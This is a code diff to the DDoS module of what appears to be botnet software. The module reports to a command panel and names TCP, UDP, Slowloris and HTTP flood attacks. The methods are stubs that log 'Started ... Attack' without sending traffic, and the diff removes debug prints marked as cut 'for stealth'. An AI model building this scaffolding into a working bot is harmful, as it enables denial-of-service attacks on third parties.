@@ -5,79 +5,61 @@ class DDOS:
         self.panelURL = panelURL
         self.C = HTTPSocket(self.panelURL, machineID)   # Initiate HTTPSocket Class
 
+    # The following DDOS methods are currently placeholders, as noted in the README.
+    # They only log success and clean commands without implementing actual attack logic.
+
     def TCP_attack(self, target_host, thread_number, max_timeout_number):
         try:
-            # print("[*] Started TCP Attack") # Removed for stealth
-            self.C.Log("Succ", "Started TCP Attack")
+            self.C.Log("Succ", f"Started TCP Attack on {target_host}")
             self.C.Send("CleanCommands")            
         except Exception as e:
-            # print("[Error In DDOS, TCP_attack() Function]") # Removed for stealth
-            # print(f"[Error] : {e}") # Removed for stealth
             self.C.Send("CleanCommands")               
-            self.C.Log("Fail", "An unexpected error occurred : " + str(e))  
+            self.C.Log("Fail", "An unexpected error occurred during TCP attack initiation: " + str(e))  
 
     def UDP_attack(self, target_host, thread_number, max_timeout_number):
         try:
-            # print("[*] Started UDP Attack") # Removed for stealth
-            self.C.Log("Succ", "Started UDP Attack")
+            self.C.Log("Succ", f"Started UDP Attack on {target_host}")
             self.C.Send("CleanCommands")            
         except Exception as e:
-            # print("[Error In DDOS, UDP_attack() Function]") # Removed for stealth
-            # print(f"[Error] : {e}") # Removed for stealth
             self.C.Send("CleanCommands")
-            self.C.Log("Fail", "An unexpected error occurred : " + str(e)) 
+            self.C.Log("Fail", "An unexpected error occurred during UDP attack initiation: " + str(e)) 
             
     def Slowloris_attack(self, target_host, thread_number, max_timeout_number):
         try:
-            # print("[*] Started Slowloris Attack") # Removed for stealth
-            self.C.Log("Succ", "Started Slowloris Attack")
+            self.C.Log("Succ", f"Started Slowloris Attack on {target_host}")
             self.C.Send("CleanCommands")            
         except Exception as e:
-            # print("[Error In DDOS, Slowloris_attack() Function]") # Removed for stealth
-            # print(f"[Error] : {e}") # Removed for stealth
             self.C.Send("CleanCommands")
-            self.C.Log("Fail", "An unexpected error occurred : " + str(e))  
+            self.C.Log("Fail", "An unexpected error occurred during Slowloris attack initiation: " + str(e))  
             
     def ARME_attack(self, target_host, thread_number, max_timeout_number):
         try:
-            # print("[*] Started ARME Attack") # Removed for stealth
-            self.C.Log("Succ", "Started ARME Attack")
+            self.C.Log("Succ", f"Started ARME Attack on {target_host}")
             self.C.Send("CleanCommands")            
         except Exception as e:
-            # print("[Error In DDOS, ARME_attack() Function]") # Removed for stealth
-            # print(f"[Error] : {e}") # Removed for stealth
             self.C.Send("CleanCommands")
-            self.C.Log("Fail", "An unexpected error occurred : " + str(e))  
+            self.C.Log("Fail", "An unexpected error occurred during ARME attack initiation: " + str(e))  
 
     def PostHTTP_attack(self, target_host, thread_number, max_timeout_number):
         try:
-            # print("[*] Started PostHTTP Attack") # Removed for stealth
-            self.C.Log("Succ", "Started PostHTTP Attack")
+            self.C.Log("Succ", f"Started PostHTTP Attack on {target_host}")
             self.C.Send("CleanCommands")            
         except Exception as e:
-            # print("[Error In DDOS, PostHTTP_attack() Function]") # Removed for stealth
-            # print(f"[Error] : {e}") # Removed for stealth
             self.C.Send("CleanCommands")
-            self.C.Log("Fail", "An unexpected error occurred : " + str(e)) 
+            self.C.Log("Fail", "An unexpected error occurred during PostHTTP attack initiation: " + str(e)) 
             
     def HTTPGet_attack(self, target_host, thread_number, max_timeout_number):
         try:
-            # print("[*] Started HTTPGet Attack") # Removed for stealth
-            self.C.Log("Succ", "Started HTTPGet Attack")
+            self.C.Log("Succ", f"Started HTTPGet Attack on {target_host}")
             self.C.Send("CleanCommands")            
         except Exception as e:
-            # print("[Error In DDOS, HTTPGet_attack() Function]") # Removed for stealth
-            # print(f"[Error] : {e}") # Removed for stealth
             self.C.Send("CleanCommands")
-            self.C.Log("Fail", "An unexpected error occurred : " + str(e))     
+            self.C.Log("Fail", "An unexpected error occurred during HTTPGet attack initiation: " + str(e))     
 
     def BandwidthFlood_attack(self, target_host, thread_number, max_timeout_number):
         try:
-            # print("[*] Started BandwidthFlood Attack") # Removed for stealth
-            self.C.Log("Succ", "Started BandwidthFlood Attack")
+            self.C.Log("Succ", f"Started BandwidthFlood Attack on {target_host}")
             self.C.Send("CleanCommands")            
         except Exception as e:
-            # print("[Error In DDOS, BandwidthFlood_attack() Function]") # Removed for stealth
-            # print(f"[Error] : {e}") # Removed for stealth
             self.C.Send("CleanCommands")
-            self.C.Log("Fail", "An unexpected error occurred : " + str(e))
+            self.C.Log("Fail", "An unexpected error occurred during BandwidthFlood attack initiation: " + str(e))
